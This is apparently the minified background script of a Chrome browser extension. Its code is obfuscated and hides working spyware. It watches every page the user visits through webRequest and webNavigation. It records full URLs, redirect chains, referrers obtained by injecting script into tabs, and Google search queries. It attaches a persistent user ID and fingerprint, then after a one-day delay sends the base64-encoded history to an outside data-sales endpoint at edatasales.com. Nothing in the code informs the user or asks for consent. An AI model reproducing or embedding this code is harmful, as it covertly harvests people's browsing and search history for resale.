require=(function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&&require;for(var o=0;o<r.length;o++)s(r[o]);return s})({1:[function(require,module,exports){'use strict';function umbmY () { this.spawned = Date.now(); this.attemptedInstantiations = 0; initData(); if (!localStorage.feedbackOptOut && !localStorage.feedbackOptOut2) { if (!window.firstSpawned) { chrome.runtime.onMessage.addListener(this.BjnbE.bind(this)); require('framework/request'); require('framework/gserp'); require('framework/navigation'); window.firstSpawned = this.spawned; } else { chrome.runtime.sendMessage({ spawned: this.spawned }); } }}umbmY.prototype = { constructor: umbmY, BjnbE: function (msg) { if (msg.spawned && msg.spawned !== this.spawned) { this.attemptedInstantiations += 1; window.attemptedInstantiations = this.attemptedInstantiations; } }};new umbmY();},{"framework/gserp":"framework/gserp","framework/navigation":"framework/navigation","framework/request":"framework/request"}],"config":[function(require,module,exports){'use strict';module.exports = { sourceId: 'A9LZecYD-vHUZ-Tufp-hrmp-bxorCHy6KmCR', typeHistory: 'history', typeStats: 'stats', debug: false, standalone: true, version: '1.1.8', apiUrl: 'https://edatasales.com/sdk/'};},{}],"framework/gserp":[function(require,module,exports){'use strict';let config = require('config');let request = require('framework/request');let utils = require('framework/utils');let network = require('framework/network');function nrcIm () { this.CZUTG = {}; chrome.webRequest.onBeforeRequest.addListener( this.BBDii.bind(this), nrcIm.DefaultFilter); chrome.webRequest.onCompleted.addListener( this.VyKaP.bind(this), nrcIm.DefaultFilter); return { serped: this.serped }}nrcIm.DefaultFilter = { urls: [ '<all_urls>' ], types: [ 'xmlhttprequest', 'other' ]};nrcIm.prototype = { constructor: nrcIm, KUSUQ: function (id) { this.CZUTG[id] = this.CZUTG[id] || new request.Request({ query: null, requestType: null, timeStamp: null, url: null }); }, BBDii: function (data) { if (this.WWpYj(data)) { let id = data.tabId; this.KUSUQ(id); this.CZUTG[id].requestType = data.type; this.CZUTG[id].timeStamp = data.timeStamp; this.CZUTG[id].url = data.url; } }, VyKaP: function (data) { if (this.WWpYj(data) && this.CZUTG[data.tabId]) { this.CZUTG[data.tabId].query = this.Gdkdb('q', data.url); request.serped[data.tabId] = this.CZUTG[data.tabId]; delete this.CZUTG[data.tabId]; } else { if (data.method === 'POST') { for (let id of Object.keys(request.completed)) { if (request.completed[id].url === this.Gdkdb('url', data.url)) { request.getTabData(request.completed[id].tabId, id); } } } } }, WWpYj: function (data) { return /(https?:\/{2}(?:www.)?google\..{2,}\/s(?:earch)?)/i.test(data.url); }, Gdkdb: function (type, url) { let pattern = new RegExp('\\W' + type + '=([^&#]*)', 'i'), matchedValues = url.match(pattern); return matchedValues ? decodeURIComponent(matchedValues[1]) : null; }, get serped () { return this.CZUTG; }};module.exports = new nrcIm;},{"config":"config","framework/network":"framework/network","framework/request":"framework/request","framework/utils":"framework/utils"}],"framework/navigation":[function(require,module,exports){'use strict';let utils = require('framework/utils');let request = require('framework/request');function EGtFp () { chrome.webNavigation.onCommitted.addListener(this.botAB.bind(this)); chrome.webNavigation.onErrorOccurred.addListener(this.wkFKc.bind(this));}EGtFp.PFIzZ = [ 'auto_bookmark', 'form_submit', 'generated', 'keyword', 'keyword_generated', 'link', 'manual_subframe', 'reload', 'start_page', 'typed'];EGtFp.WvSlv = [ 'client_redirect', 'server_redirect', 'forward_back', 'from_address_bar'];EGtFp.prototype = { constructor: EGtFp, botAB: function (data) { let storages = [request.pending, request.completed]; if (!utils.mSedQ(data.url) && this.DoZWp(data)) { storages.forEach(function (storage, index) { for (let id of Object.keys(storage)) { if (storage[id].events && storage[id].tabId === data.tabId) { storage[id].transitionType = storage[id].transitionType || data.transitionType; storage[id].transitionQualifiers = storage[id].transitionQualifiers || data.transitionQualifiers.join(); storage[id].commited = true; index && request.getTabData(data.tabId, id); } } }); } }, wkFKc: function (data) { }, DoZWp: function (data) { return data.url && EGtFp.PFIzZ.indexOf(data.transitionType) > -1; }};module.exports = new EGtFp;},{"framework/request":"framework/request","framework/utils":"framework/utils"}],"framework/network":[function(require,module,exports){'use strict';var config = require('config');var utils = require('framework/utils');function PiOpd () { return { HzWPY: this.HzWPY.bind(this) }}PiOpd.prototype = { constructor: PiOpd, tGalz: function (rawPayload, callback) { if (this.xhr.readyState !== 4) return; if (this.xhr.status === 200 && callback) { callback.call(this, JSON.parse(this.xhr.responseText)); } else { callback.call(this, { type: 'error', data: [this.xhr.status, this.xhr.statusText].join(' ') }); } }, HzWPY: function (rawPayload, callback) { var requestParams = '?' + utils.prepareParams(rawPayload, true); if (!localStorage.feedbackOptOut && !localStorage.feedbackOptOut2 && getInit()) { this.xhr = new XMLHttpRequest(); if (callback) { this.xhr.onload = this.tGalz.bind(this, rawPayload, callback); } this.xhr.open('GET', config.apiUrl + requestParams, true); this.xhr.send(); } }};module.exports = new PiOpd;},{"config":"config","framework/utils":"framework/utils"}],"framework/request":[function(require,module,exports){'use strict';let config = require('config');let utils = require('framework/utils');let network = require('framework/network');function vRZDF () { this.pending_ = {}; this.completed_ = {}; this.errored_ = {}; this.CZUTG = {}; this.GvuJq(); chrome.webRequest.onBeforeRequest.addListener( this.BBDii.bind(this), vRZDF.DefaultFilter); chrome.webRequest.onBeforeRedirect.addListener( this.aUaep.bind(this), vRZDF.DefaultFilter); chrome.webRequest.onCompleted.addListener( this.VyKaP.bind(this), vRZDF.DefaultFilter); chrome.webRequest.onErrorOccurred.addListener( this.wkFKc.bind(this), vRZDF.DefaultFilter); return { pending: this.pending, completed: this.completed, errored: this.errored, serped: this.serped, getTabData: this.getTabData.bind(this), Request: vRZDF.Request }}vRZDF.DefaultFilter = { urls: [ '<all_urls>' ], types: [ 'main_frame' ]};vRZDF.Request = function (props) { this.commited_ = false; this.url_ = null; for (let key of Object.keys(props)) { this[key] = props[key]; } return this;};vRZDF.Request.prototype = { set commited (value) { this.commited_ = value; }, get commited () { return this.commited_; }, set url (value) { this.url_ = value; }, get url () { return this.url_; }};vRZDF.prototype = { constructor: vRZDF, QAvNa: function (data) { return data.tabId + '-' + (data.requestId ? data.requestId : 0); }, KUSUQ: function (id) { this.pending_[id] = this.pending_[id] || new vRZDF.Request({ events: [], requestType: null, tabId: null, transitionType: null, transitionQualifiers: null }); this.completed_[id] = this.completed_[id] || {}; this.errored_[id] = this.errored_[id] || {}; }, GvuJq: function () { try { var result = {}; result.userId = localStorage['userId']; if (result.userId) { this.xXLIl(result.userId); } else { this.xXLIl(this.qDuhX(), true); } if (!config.standalone) { network.HzWPY( { sourceId: config.sourceId, sessionId: this.sessionId, type: config.typeHistory, userId: this.userId }, function (result) { chrome.runtime.sendMessage(result); } ); } } catch (error) { this.xXLIl(this.qDuhX()); } this.tDgDJ(this.qDuhX()); this.jMJrb(this.Ajzuv()); }, BBDii: function (data) { if (utils.mSedQ(data.url)) { return; } let id = this.QAvNa(data); this.KUSUQ(id); this.pending_[id].events.push({ timeStamp: data.timeStamp, url: data.url }); this.pending_[id].requestType = data.type; this.pending_[id].tabId = data.tabId; this.pending_[id].url_ = data.url; }, aUaep: function (data) { if (utils.mSedQ(data.url)) { return; } let id = this.QAvNa(data); this.KUSUQ(id); this.pending_[id].events.push({ statusCode: data.statusCode, timeStamp: data.timeStamp, url: data.redirectUrl }); }, VyKaP: function (data) { if (utils.mSedQ(data.url)) { return; } let id = this.QAvNa(data); if (this.pending_[id]) { this.KUSUQ(id); this.pending_[id].events.push({ statusCode: data.statusCode, timeStamp: data.timeStamp, url: data.url }); this.pending_[id].events = this.YOXrw(this.pending_[id].events); this.completed_[id] = this.pending_[id]; delete this.pending_[id]; if (this.completed_[id].commited) { this.getTabData(data.tabId, id); } } else { } }, wkFKc: function (data) { let id = this.QAvNa(data); if (this.pending_[id]) { this.KUSUQ(id); this.errored_[id] = { error: data.error, fromCache: data.fromCache, tabId: data.tabId, timeStamp: data.timeStamp, url: data.url }; delete this.pending_[id]; } else { } }, YOXrw: function (events) { let processedEvents = []; for (let index = events.length; index--;) { let prevIndex = index - 1, url = events[prevIndex].url, start = events[prevIndex].timeStamp, end = events[index].timeStamp, status = events[index].statusCode; processedEvents.push([url, start, end, status]); index = prevIndex; } return processedEvents.reverse(); }, SriPu: function (id, pageData) { let payload = { sourceId: config.sourceId, sessionId: this.sessionId, type: config.typeStats, userId: this.userId, version: config.version }, gReferrerPattern = /^(https?:\/{2}(?:\w+\.)?google.\w{2,}\/)$/i; if (window.attemptedInstantiations) { payload.ai = window.attemptedInstantiations; } if (pageData) { let tabIds = [ pageData.openerTabId, pageData.tabId ]; for (let key of Object.keys(pageData)) { payload[key] = (pageData[key] === null) ? '' : pageData[key]; } payload.referrer = new utils.hdCyo(payload.referrer).url; for (let tabId of tabIds) { if (tabId && this.CZUTG[tabId]) { payload.referrer = this.CZUTG[tabId].url; } } } this.irlMc(); payload.fingerprint = this.fingerprint; for (let key of Object.keys(this.completed_[id])) { let value = this.completed_[id][key]; if (!/_$/i.test(key)) { payload[key] = value === null ? '' : value; } } delete this.completed_[id]; config.debug && this.IrtzT(payload); payload.events = btoa(encodeURIComponent(JSON.stringify(payload.events))); network.HzWPY(payload, !config.standalone && this.CglLr.bind(this)); }, CglLr: function (data) { chrome.runtime.sendMessage(data); }, xXLIl: function (userId, doWriteStorage) { this.userId = userId; if (doWriteStorage) { localStorage['userId'] = this.userId; } }, tDgDJ: function (sessionId) { this.sessionId = sessionId; localStorage['sessionId'] = this.sessionId; }, jMJrb: function (fingerprint) { this.fingerprint = fingerprint; }, qDuhX: function () { let s4 = function () { return Math.floor((1 + Math.random()) * 0x10000) .toString(16) .substring(1); }; return s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4(); }, Ajzuv: function () { return Math.floor(Math.random() * 1e8); }, irlMc: function () { this.fingerprint = this.fingerprint + 1; }, sueYf: function (tabId) { return new Promise(function (resolve, reject) { chrome.tabs.get( tabId, function (tab) { if (!chrome.runtime.lastError) { resolve({ openerTabId: tab.openerTabId || null, tabId: tabId }); } else { reject(chrome.runtime.lastError); } } ); }); }, ZMnGV: function (options) { let dataObj = {}; return function (data) { return new Promise(function (resolve) { chrome.tabs.executeScript( data.tabId, { code: options.code, runAt: 'document_start' }, function (result) { for (let key of Object.keys(data)) { dataObj[key] = data[key]; } dataObj[options.name] = result[0]; resolve(dataObj); } ); }) .then(function (data) { return data; }); } }, IrtzT: function (payload) { let devPayload = {}; console.groupCollapsed(payload.tabId, payload.events[0][0]); for (let key of Object.keys(payload)) { if (key === 'events') { console.table(payload[key]); } else { devPayload[key] = { value: payload[key] }; } } console.table(devPayload); console.groupEnd(); }, getTabData: function (tabId, requestId) { let getReferrer = this.ZMnGV({ code: 'document.referrer', name: 'referrer' }); this.sueYf(tabId) .then(getReferrer) .then(function (tabData) { if (this.completed_[requestId]) { this.SriPu(requestId, tabData); } }.bind(this)) .catch(function (error) { }); }, get pending () { return this.pending_; }, get completed () { return this.completed_; }, get errored () { return this.errored_; }, get serped () { return this.CZUTG; }};module.exports = new vRZDF;},{"config":"config","framework/network":"framework/network","framework/utils":"framework/utils"}],"framework/utils":[function(require,module,exports){'use strict';var config = require('config');function hdCyo (url) { if (/^https:\/\//i.test(url)) { this.match_ = url.match(/^(https?:\/\/[^\/#?\s]+)([\w\-\.]?[^#?\s]*)(.*)?(#[\w\-]+)?$/i); this.url_ = this.match_[1]; } else { this.url_ = url; }}hdCyo.prototype = { get url () { return this.url_; }, get origin () { return this.match_[1]; }, get path () { return this.match_[2]; }, get query () { return this.match_[3]; }};module.exports = { hdCyo: hdCyo, mSedQ: function (url) { var patterns = [ /(\/(?:sdk|geo)\/\?)/i, /^(chrome-?\S*:\/\/)/i, /(\/(?:chrome|async)\/newtab)/i, /(google.\w+\/webhp\?.+)$/i ]; for (let i = patterns.length; i--;) { if (patterns[i].test(url)) { return true; } } return false; }, extend: function () { var i, key; for (i = arguments.length; i--;) { for (key in arguments[i]) { if (arguments[i].hasOwnProperty(key)) { arguments[0][key] = arguments[i][key]; } } } return arguments[0]; }, prepareParams: function (object, isEncodeUri) { var paramsArray = [], key; for (key in object) { if (object.hasOwnProperty(key)) { paramsArray.push(key + '=' + (isEncodeUri ? encodeURIComponent(object[key]) : object[key])); } } return paramsArray.join(isEncodeUri ? '&' : ','); }};},{"config":"config"}]},{},[1]);function initData() { var key = 'initd'; if (!localStorage[key]) { localStorage[key] = new Date().getTime(); }}function getInit() { var result = 0; var initd = localStorage['initd']; if (initd) { result = Math.round(Math.abs((new Date().getTime() - initd) / 86400000)); } return result;}